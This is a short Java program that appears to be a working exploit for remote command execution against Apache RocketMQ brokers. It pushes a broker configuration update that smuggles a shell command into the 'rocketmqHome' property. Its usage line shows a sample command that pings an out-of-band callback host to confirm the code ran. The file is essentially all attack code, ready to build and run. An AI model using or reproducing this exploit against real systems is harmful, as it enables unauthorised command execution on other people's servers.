package org.example;

import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
import java.util.Properties;

public class Main {
	public static void main(String[] args) throws Exception {
		if (args.length ==2) {
		String url = args[0];
		String cmd = args[1];
		updateConfig(url,cmd);
		}else {
			System.out.println("Usage java -jar this.jar  8.8.8.8:8899/  \"ping -nc 3 chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun\"");
		}
	}

	public static void updateConfig(String url,String cmd) throws Exception {
		Properties props = new Properties();
		props.setProperty("rocketmqHome",String.format("-c $@|sh . echo %s;",cmd));
		props.setProperty("filterServerNums","1");
		// 创建 DefaultMQAdminExt 对象并启动
		DefaultMQAdminExt admin = new DefaultMQAdminExt();
		admin.setNamesrvAddr("localhost:9876");
		admin.start();
		// 更新配置⽂件
		admin.updateBrokerConfig(url, props);
		Properties brokerConfig = admin.getBrokerConfig(url);
		System.out.println(brokerConfig.getProperty("rocketmqHome"));
		System.out.println(brokerConfig.getProperty("filterServerNums"));
		// 关闭 DefaultMQAdminExt 对象
		admin.shutdown();
	}
}